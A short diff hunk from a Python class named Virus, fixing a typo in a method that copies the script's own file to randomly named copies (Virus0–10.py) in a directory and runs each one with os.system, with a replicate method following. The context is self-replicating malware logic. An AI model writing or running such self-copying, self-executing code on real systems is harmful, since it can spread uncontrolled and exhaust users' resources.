@@ -35,7 +35,7 @@ class Virus:
             n = random.randint(0,10)
             new_script="Virus"+str(n)+".py"
             destination = os.path.join(directory, new_script)
-            shutil.copyfile(self.own_path, destination)s
+            shutil.copyfile(self.own_path, destination)
             os.system(new_script + " 1")
 #Replcate   
     def replicate(self):
